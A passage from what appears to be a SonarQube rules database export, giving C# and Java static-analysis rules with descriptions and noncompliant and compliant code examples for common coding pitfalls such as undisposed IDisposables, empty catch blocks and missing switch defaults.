//Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar lowered = someString.ToLower(CultureInfo.InvariantCulture);\n</pre>\nor\n<pre>\nvar lowered = someString.ToLowerInvariant();\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,unpredictable	f	HTML	1511453806234	1511453806235	1
19	Objects should not be created to be dropped immediately without being used	S1848	\N	csharpsquid	<p>\nThere is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could lead to an unexpected behavior in production.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x < 0)\n  new ArgumentException("x must be nonnegative");\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (x < 0)\n  throw new ArgumentException("x must be nonnegative");\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806238	1511453806239	2
51	break statements should not be used except for switch cases	S1227	\N	csharpsquid	<p>\n<code>break;</code> is an unstructured control flow statement which makes code harder to read.\nIdeally, every loop should have a single termination condition.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint i = 0;\nwhile (true)\n{\n  if (i == 10)\n  {\n    break;      // Non-Compliant\n  }\n\n  Console.WriteLine(i);\n  i++;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nint i = 0;\nwhile (i != 10) // Compliant\n{\n  Console.WriteLine(i);\n  i++;\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453806302	1511453806302	1
20	Method calls should not resolve ambiguously to overloads with "params"	S3220	\N	csharpsquid	<p>\n    The rules for method resolution are complex and perhaps not properly understood by all coders. The <code>params</code> keyword can make\n    method declarations overlap in non-obvious ways, so that slight changes in the argument types of an invocation can resolve to different\n    methods.\n</p>\n<p>\n    This rule raises an issue when an invocation resolves to a method declaration with <code>params</code>, but could also resolve to another\n    non-<code>params</code> method too.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass\n{\n  private void Format(string a, params object[] b) { }\n\n  private void Format(object a, object b, object c) { }\n}\n\n// ...\nMyClass myClass = new MyClass();\n\nmyClass.Format("", null, null); //Noncompliant, resolves to the first Format with params, but was that intended?\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453806242	1511453806242	1
21	Write-only properties should not be used	S2376	\N	csharpsquid	<p>\n    Properties with only setters are confusing and counterintuitive. Instead, a property getter should be added if possible, or\n    the property should be replaced with a setter method.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Program\n{\n    public int Foo  //Non-Compliant\n    {\n        set\n        {\n            // ... some code ...\n        }\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass Program\n{\n    public void SetFoo(int value)\n    {\n        // ... some code ...\n    }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453806245	1511453806246	1
22	Optional parameters should be passed to "base" calls	S3466	\N	csharpsquid	<p>\n    Generally, writing the least code that will readably do the job is a good thing, so omitting default parameter values seems to \n    make sense. Unfortunately, when you omit them from the <code>base</code> call in an override, you're not actually getting the \n    job done thoroughly, because you're ignoring the value the caller passed in. The result will likely not be what the caller \n    expected.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class BaseClass\n{\n  public virtual void MyMethod(int i = 1)\n  { \n    Console.WriteLine(i);\n  }\n}\n\npublic class DerivedClass : BaseClass\n{\n  public override void MyMethod(int i = 1)\n  {\n    // ... \n    base.MyMethod(); // Noncompliant; caller's value is ignored\n  }\n\n  static int Main(string[] args) \n  {\n    DerivedClass dc = new DerivedClass();\n    dc.MyMethod(12);  // prints 1\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class BaseClass\n{\n  public virtual void MyMethod(int i = 1)\n  { \n    Console.WriteLine(i);\n  }\n}\n\npublic class DerivedClass : BaseClass\n{\n  public override void MyMethod(int i = 1)\n  {\n    // ... \n    base.MyMethod(i);\n  }\n\n  static int Main(string[] args) \n  {\n    DerivedClass dc = new DerivedClass();\n    dc.MyMethod(12);  // prints 12\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806249	1511453806250	2
23	"IDisposables" should be disposed	S2930	\N	csharpsquid	<p>\n    When writing managed code, you don't need to worry about allocating or freeing memory: The garbage collector takes care of it. For efficiency\n    reasons, some objects such as <code>Bitmap</code> use unmanaged memory, enabling for example the use of pointer arithmetic. Such objects have\n    potentially huge unmanaged memory footprints, but will have a tiny managed ones. Unfortunately, the garbage collector only sees the tiny\n    managed footprint, and fails to reclaim the unmanaged memory (by calling <code>Bitmap</code>'s finalizer method) in a timely fashion.\n</p>\n\n<p>\n    Moreover, memory is not the only system resource which needs to managed in a timely fashion: The operating system can only handle having so\n    many file descriptors (e.g. <code>FileStream</code>) or sockets (e.g. <code>WebClient</code>) open at any given time. Therefore, it is\n    important to <code>Dispose</code> of them as soon as they are no longer needed, rather than relying on the garbage collector to call these\n    objects' finalizers at some nondeterministic point in the future.\n</p>\n\n<p>\n    This rule tracks <code>private</code> fields and local variables of the following <code>IDisposable</code> types, which are never disposed,\n    closed, aliased, returned, or passed to other methods.\n</p>\n\n<ul>\n    <li>\n        <code>System.IO</code> namespace\n        <ul>\n            <li><code>System.IO.FileStream</code></li>\n            <li><code>System.IO.StreamReader</code></li>\n            <li><code>System.IO.StreamWriter</code></li>\n        </ul>\n    </li>\n    <li>\n        <code>System.Net</code> namespace\n        <ul>\n            <li><code>System.Net.WebClient</code></li>\n        </ul>\n    </li>\n    <li>\n        <code>System.Net.Sockets</code> namespace\n        <ul>\n            <li><code>System.Net.Sockets.Socket</code></li>\n            <li><code>System.Net.Sockets.TcpClient</code></li>\n            <li><code>System.Net.Sockets.TcpListener</code></li>\n            <li><code>System.Net.Sockets.UdpClient</code></li>\n        </ul>\n    <li>\n        <code>System.Drawing</code> namespace\n        <ul>\n            <li><code>System.Drawing.Image</code></li>\n            <li><code>System.Drawing.Bitmap</code></li>\n        </ul>\n    </li>\n</ul>\n\nwhich are either instantiated directly using the <code>new</code> operator, or using one of the following factory methods:\n\n<ul>\n    <li><code>System.IO.File.Create()</code></li>\n    <li><code>System.IO.File.Open()</code></li>\n    <li><code>System.Drawing.Image.FromFile()</code></li>\n    <li><code>System.Drawing.Image.FromStream()</code></li>\n</ul>\n\non both private fields and local variables.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ResourceHolder\n{\n  private FileStream fs; // Noncompliant; Dispose or Close are never called\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void WriteToFile(string path, string text)\n  {\n    var fs = new FileStream(path, FileMode.Open); // Noncompliant\n    var bytes = Encoding.UTF8.GetBytes(text);\n    fs.Write(bytes, 0, bytes.Length);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class ResourceHolder : IDisposable\n{\n  private FileStream fs;\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void Dispose()\n  {\n    this.fs.Dispose();\n  }\n  public void WriteToFile(string path, string text)\n  {\n    using (var fs = new FileStream(path, FileMode.Open))\n    {\n      var bytes = Encoding.UTF8.GetBytes(text);\n      fs.Write(bytes, 0, bytes.Length);\n    }\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    <code>IDisposable</code> variables returned from a method or passed to other methods are ignored, as are local <code>IDisposable</code>s that\n    are initialized with other <code>IDisposable</code>s.\n</p>\n<pre>\npublic Stream WriteToFile(string path, string text)\n{\n  var fs = new FileStream(path, FileMode.Open); // Compliant, because it is returned\n  var bytes = Encoding.UTF8.GetBytes(text);\n  fs.Write(bytes, 0, bytes.Length);\n  return fs;\n}\npublic void ReadFromStream(Stream s)\n{\n  var sr = new StreamReader(s); // Compliant as it would close the underlying stream.\n  // ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe,denial-of-service	f	HTML	1511453806253	1511453806258	2
24	Fields should not be initialized to default values	S3052	\N	csharpsquid	<p>\n    The compiler automatically initializes class fields to their default values before setting them with any initialization\n    values, so there is no need to explicitly set a field to its default value. Further, under the logic that cleaner code\n    is better code, it's considered poor style to do so.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass X\n{\n  public int field = 0; // Noncompliant\n  public object o = null; // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass X\n{\n  public int field;\n  public object o;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<code>const</code> fields are ignored.	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention,finding	f	HTML	1511453806259	1511453806259	1
41	Sequential tests should not check the same condition	S2760	\N	csharpsquid	<p>\n    When the same condition is checked twice in a row, it is either confusing - why have separate checks? - or an error - some other condition\n    should have been checked in the second test.\n</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (a == b)\n{\n  doTheThing(b);\n}\nif (a == b) // Noncompliant; is this really what was intended?\n{\n  doTheThing(c);\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (a == b)\n{\n  doTheThing(b);\n  doTheThing(c);\n}\n</pre>\n\nor\n\n<pre>\nif (a == b)\n{\n  doTheThing(b);\n}\nif (b == c)\n{\n  doTheThing(c);\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Since it is a common pattern to test a variable, reassign it if it fails the test, then re-test it, that pattern is ignored.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,suspicious	f	HTML	1511453806284	1511453806285	1
25	"if ... else if" constructs should end with "else" clause	S126	\N	csharpsquid	<p>\n  This rule applies whenever an <code>if</code> statement is followed by one or\n  more <code>else if</code> statements, the final <code>else if</code> should be\n  followed by an <code>else</code> statement.\n</p>\n\n<p>\nThe requirement for a final <code>else</code> statement is defensive programming.\nThe <code>else</code> statement should either take appropriate action or contain\na suitable comment as to why no action is taken. This is consistent with the\nrequirement to have a final <code>default</code> clause in a <code>switch</code>\nstatement.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x == 0)\n{\n  doSomething();\n} else if (x == 1)\n{\n  doSomethingElse();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (x == 0)\n{\n  doSomething();\n} else if (x == 1)\n{\n  doSomethingElse();\n} else\n{\n  throw new IllegalStateException();\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause.</li>\n    <li>MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause.</li>\n    <li>MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC64-Java</a> - Strive for logical completeness</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra	f	HTML	1511453806260	1511453806261	1
26	Delegates should not be subtracted	S3172	\N	csharpsquid	<p>\n    In C#, delegates can be added together to chain their execution, and subtracted to remove their execution from the chain.\n</p>\n<p>\n    Subtracting a chain of delegates from another one might yield unexpected results as shown hereunder - and is likely to be a bug\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nMyDelegate first, second, third, fourth;\nfirst = () => Console.Write("1");\nsecond = () => Console.Write("2");\nthird = () => Console.Write("3");\nfourth = () => Console.Write("4");\n\nMyDelegate chain1234 = first + second + third + fourth; // Compliant - chain sequence = "1234"\nMyDelegate chain12 = chain1234 - third - fourth; // Compliant - chain sequence = "12"\n\n// The chain sequence of "chain23" will be "1234" instead of "23"!\n// Indeed, the sequence "1234" does not contain the subsequence "14", so nothing is subtracted\n// (but note that "1234" contains both the "1" and "4" subsequences)\nMyDelegate chain23 = chain1234 - (first + fourth); // Noncompliant\n\nchain23(); // will print "1234"!\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nMyDelegate chain23 = chain1234 - first - fourth; // Compliant - "1" is first removed, followed by "4"\n\nchain23(); // will print "23"\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	\N	f	HTML	1511453806262	1511453806262	2
27	"for" loop stop conditions should be invariant	S127	\N	csharpsquid	<p>\n    <code>for</code> loop stop conditions must be invariant (i.e. true at both the beginning and ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins.\n</p>\n<p>\n    Stop conditions that are not invariant are difficult to understand and maintain, and will likely lead to the introduction of errors in the future.\n</p>\n<p>\n    This rule tracks three types of non-invariant stop conditions:\n    <ul>\n        <li>When the loop counters are updated in the body of the <code>for</code> loop</li>\n        <li>When the stop condition depend upon a method call</li>\n        <li>When the stop condition depends on an object property, since such properties could change during the execution of the loop.</li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo\n{\n    static void Main()\n    {\n        for (int i = 1; i &lt;= 5; i++)\n        {\n            Console.WriteLine(i);\n            if (condition)\n            {\n               i = 20;\n           }\n        }\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Foo\n{\n    static void Main()\n    {\n        for (int i = 1; i &lt;= 5; i++)\n        {\n            Console.WriteLine(i);\n        }\n    }\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 13.6 - Numeric variables being used within a for loop for iteration counting shall not be modified in the body of the loop.</li>\n    <li>MISRA C++:2008, 6-5-3 - The loop-counter shall not be modified within condition or statement.</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	misra,pitfall	f	HTML	1511453806263	1511453806264	1
28	Parameters with "[DefaultParameterValue]" attributes should also be marked with "[Optional]"	S3450	\N	csharpsquid	<p>\n    There is no point in providing a default value for a parameter if callers are required to provide a value for it anyway. Thus,\n    <code>[DefaultParameterValue]</code> should always be used in conjunction with <code>[Optional]</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void MyMethod([DefaultParameterValue(5)] int j) //Noncompliant, useless\n{\n  Console.WriteLine(j);\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void MyMethod(int j = 5)\n{\n  Console.WriteLine(j);\n}\n</pre>\n<p>or</p>\n<pre>\npublic void MyMethod([DefaultParameterValue(5)][Optional] int j)\n{\n  Console.WriteLine(j);\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453806265	1511453806266	1
29	Sections of code should not be "commented out"	S125	\N	csharpsquid	<p>\n    Programmers should not comment out code as it bloats programs and reduces readability.\n    Unused code should be deleted and can be retrieved from source control history if required.\n</p>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2004, 2.4 - Sections of code should not be "commented out".</li>\n    <li>MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments.</li>\n    <li>MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments.</li>\n    <li>MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out"</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453806266	1511453806267	1
30	Optional parameters should not be used	S2360	\N	csharpsquid	<p>\n    The overloading mechanism should be used in place of optional parameters for several reasons:\n    <ul>\n        <li>Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need to be rebuilt, otherwise the original values will be used.</li>\n        <li>The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify the values.</li>\n        <li>The concept of optional argument exists only in VB.Net and C#. In all other languages like C++ or Java, the overloading mechanism is the only way to get the same behavior.</li>\n        <li>Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters, when one is defined, is the second one still optional or mandatory?</li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid Notify(string company, string office = "QJZ") // Noncompliant\n{\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nvoid Notify(string company)\n{\n  Notify(company, "QJZ");\n}\nvoid Notify(string company, string office = "QJZ")\n{\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806268	1511453806268	1
109	"switch" statements should not have too many "case" clauses	S1479	\N	csharpsquid	<p>\n  When <code>switch</code> statements have a large set of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map structure would be more readable and maintainable, and should be used instead.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	brain-overload	f	HTML	1511453806382	1511453806383	1
31	"partial" method parameter names should match	S927	\N	csharpsquid	<p>\n    When the parameters to the implementation of a <code>partial</code> method don't match those\n    in the signature declaration, then confusion is almost guaranteed. Either the implementer was\n    confused when he renamed, swapped or mangled the parameter names in the implementation, or\n    callers will be confused.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npartial class Point\n{\n  partial void MoveVertically(int z);\n}\n\npartial class Point\n{\n  int x = 0;\n  int y = 0;\n  int z = 0;\n\n  partial void MoveVertically(int y)  // Noncompliant\n  {\n    this.y = y;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npartial class Point\n{\n  partial void MoveVertically(int z);\n}\n\npartial class Point\n{\n  int x = 0;\n  int y = 0;\n  int z = 0;\n\n  partial void MoveVertically(int z)\n  {\n    this.z = z;\n  }\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 8.3 - For each function parameter the type given in the declaration and definition shall be identical, and the return types shall also be identical</li>\n    <li>MISRA C:2004, 16.4 - The identifiers used in the declaration and definition of a function shall be identical.</li>\n    <li>MISRA C++:2008, 8-4-2 - The identifiers used for the parameters in a re-declaration of a function shall be identical to those in the declaration.</li>\n    <li>MISRA C:2012, 8.3 - All declarations of an object or function shall use the same names and type qualifiers.</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,misra,pitfall	f	HTML	1511453806269	1511453806270	1
32	Inner class members should not shadow outer class "static" or type members	S3218	\N	csharpsquid	<p>\n    It's possible to name the members of an inner class the same as the <code>static</code> members of its enclosing class -\n    possible, but a bad idea. That's because maintainers may be confused about which members are being used where. Instead the\n    inner class' members should be renamed and all the references updated.\n</p>\n\n<h2>Noncompliant Code Sample</h2>\n<pre>\nclass Outer\n{\n  public static int A;\n\n  public class Inner\n  {\n    public int A; //Noncompliant\n    public int MyProp\n    {\n      get { return A; }  // Returns inner A. Was that intended?\n    }\n  }\n}\n</pre>\nAfter a rename\n<pre>\nclass Outer\n{\n  public static int A;\n\n  public class Inner\n  {\n    public int B;\n    public int MyProp\n    {\n      get { return A; }  // Still compiles and runs but functionality has changed\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Outer\n{\n  public static int A;\n\n  public class Inner\n  {\n    public int InnerA;\n    public int MyProp\n    {\n      get { return InnerA; }\n    }\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	design,pitfall	f	HTML	1511453806270	1511453806271	1
573	Disallowed methods should not be used	S2253	S2253	squid	<p>This rule allows banning certain methods.</p>\n<h2>Noncompliant Code Example</h2>\n<p>Given parameters:</p>\n<ul>\n<li> className:java.lang.String</li>\n<li> methodName: replace</li>\n<li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence</li>\n</ul>\n\n<pre>\nString name;\nname.replace("A","a");  // Noncompliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	t	HTML	1511453807104	1511453807104	1
574	Loop conditions should be true at least once	S2252	S2252	squid	If a <code>for</code> loop's condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always bugs, particularly when the initial value and stop conditions are hard-coded.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 10; i &lt; 10; i++) {  // Noncompliant \n  // ...\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807106	1511453807107	2
575	Primitives should not be boxed just for "String" conversion	S2131	S2131	squid	<p>"Boxing" is the process of putting a primitive value into a primitive-wrapper object. When that's done purely to use the wrapper class' <code>toString</code> method, it's a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a class instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code> argument should be avoided, as should concatenating empty string <code>""</code> to a primitive.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint myInt = 4;\nString myIntString = new Integer(myInt).toString(); // Noncompliant; creates &amp; discards an Integer object\nmyIntString = Integer.valueOf(myInt).toString(); // Noncompliant\nmyIntString = 4 + "";  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nint myInt = 4;\nString myIntString = Integer.toString(myInt);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807107	1511453807108	1
33	"Explicit" conversions of "foreach" loops should not be used	S3217	\N	csharpsquid	<p>\n    The <code>foreach</code> statement was introduced in the C# language prior to generics. To make it easier to work with\n    non-generic collections available at that time such as <code>ArrayList</code>, the <code>foreach</code> statements allows\n    to downcast the collection's element of type <code>Object</code> into any other type. The problem is that, to achieve that,\n    the <code>foreach</code> statements silently performs <code>explicit</code> type conversion, which at runtime can result in\n    an <code>InvalidCastException</code> to be thrown.\n</p>\n<p>\n    C# code iterating on generic collections or arrays should not rely on <code>foreach</code> statement's silent <code>explicit</code>\n    conversions.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit { }\npublic class Orange : Fruit { }\npublic class Apple : Fruit { }\n\nclass MyTest\n{\n  public void Test()\n  {\n    var fruitBasket = new List<Fruit>();\n    fruitBasket.Add(new Orange());\n    fruitBasket.Add(new Orange());\n    // fruitBasket.Add(new Apple());  // uncommenting this line will make both foreach below throw an InvalidCastException\n\n    foreach (Fruit fruit in fruitBasket)\n    {\n      var orange = (Orange)fruit; // This "explicit" conversion is hidden within the foreach loop below\n      ...\n    }\n\n    foreach (Orange orange in fruitBasket) // Noncompliant\n    {\n      ...\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar fruitBasket = new List<Orange>();\nfruitBasket.Add(new Orange());\nfruitBasket.Add(new Orange());\n// fruitBasket.Add(new Apple());  // uncommenting this line won't compile\n\nforeach (Orange orange in fruitBasket)\n{\n  ...\n}\n</pre>\nor\n<pre>\nvar fruitBasket = new List<Fruit>();\nfruitBasket.Add(new Orange());\nfruitBasket.Add(new Orange());\nfruitBasket.Add(new Apple());\n\nforeach (Orange orange in fruitBasket.OfType<Orange>())\n{\n  ...\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    The rule ignores iterations on collections of <code>object</code>s. This includes legacy code that uses\n    <code>ArrayList</code>. Furthermore, the rule does not report on cases when user defined conversions are\n    being called.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	suspicious	f	HTML	1511453806271	1511453806272	1
34	Control flow statements "if", "for", "foreach", "do", "while", "switch" and "try" should not be nested too deeply	S134	\N	csharpsquid	<p>\n    Nested <code>if</code>, <code>switch</code>, <code>for</code>, <code>foreach</code>, <code>while</code>, <code>do</code>, and <code>try</code> statements\n    are key ingredients for making what's known as "Spaghetti code". Such code is hard to read, refactor and therefore maintain.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default threshold of 3:</p>\n\n<pre>\nif (condition1) // Compliant - depth = 1\n{\n  /* ... */\n  if (condition2) // Compliant - depth = 2\n  {\n    /* ... */\n    for(int i = 0; i < 10; i++) // Compliant - depth = 3, not exceeding the limit\n    {\n      /* ... */\n      if (condition4) // Noncompliant - depth = 4\n      {\n        if (condition5) // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n        {\n          /* ... */\n        }\n        return;\n      }\n    }\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload	f	HTML	1511453806273	1511453806273	1
35	"[DefaultValue]" should not be used when "[DefaultParameterValue]" is meant	S3451	\N	csharpsquid	<p>\n    The use of <code>[DefaultValue]</code> with <code>[Optional]</code> has no more effect than <code>[Optional]</code> alone. That's because \n    <code>[DefaultValue]</code> doesn't actually do anything; it merely indicates the intent for the value. More than likely, \n    <code>[DefaultValue]</code> was used in confusion instead of <code>[DefaultParameterValue]</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n  public void DoStuff([Optional][DefaultValue(4)]int i, int j = 5)  // Noncompliant\n  {\n    Console.WriteLine(i);\n  }\n\n  public static void Main()\n  {\n    new MyClass().DoStuff(); // prints 0\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass\n{\n  public void DoStuff([Optional][DefaultParameterValue(4)]int i, int j = 5) \n  {\n    Console.WriteLine(i);\n  }\n\n  public static void Main()\n  {\n    new MyClass().DoStuff(); // prints 4\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	suspicious	f	HTML	1511453806278	1511453806278	1
36	Generic exceptions should not be ignored	S2486	\N	csharpsquid	<p>\n    When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly,\n    or at least to log them.\n</p>\n<p>\n    This rule only reports on empty catch clauses that catch generic <code>Exception</code>s.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring text = "";\ntry\n{\n  text = File.ReadAllText(fileName);\n}\ncatch (Exception exc) // Noncompliant\n{\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nstring text = "";\ntry\n{\n  text = File.ReadAllText(fileName);\n}\ncatch (Exception exc)\n{\n  logger.Log(exc);\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	cwe,error-handling	f	HTML	1511453806279	1511453806279	1
37	"switch/Select" statements should end with a "default/Case Else" clause	S131	\N	csharpsquid	<p>\n    The requirement for a final <code>default</code> clause is defensive programming. The clause should either take\n    appropriate action, or contain a suitable comment as to why no action is taken. Even when the <code>switch</code>\n    covers all current values of an <code>enum</code>, a <code>default</code> case should still be used because there is\n    no guarantee that the <code>enum</code> won't be extended.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint foo = 42;\nswitch (foo) // Noncompliant\n{\n  case 0:\n    Console.WriteLine("foo = 0");\n    break;\n  case 42:\n    Console.WriteLine("foo = 42");\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nint foo = 42;\nswitch (foo) // Compliant\n{\n  case 0:\n    Console.WriteLine("foo = 0");\n    break;\n  case 42:\n    Console.WriteLine("foo = 42");\n    break;\n  default:\n    throw new InvalidOperationException("Unexpected value foo = " + foo);\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 15.0 - The MISRA C switch syntax shall be used.</li>\n    <li>MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause</li>\n    <li>MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n    <li>MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause</li>\n    <li>MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n    <li>MISRA C:2012, 16.4 - Every switch statement shall have a default label</li>\n    <li>MISRA C:2012, 16.5 - A default label shall appear as either the first or the last switch label of a switch statement</li>\n    <li><a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case 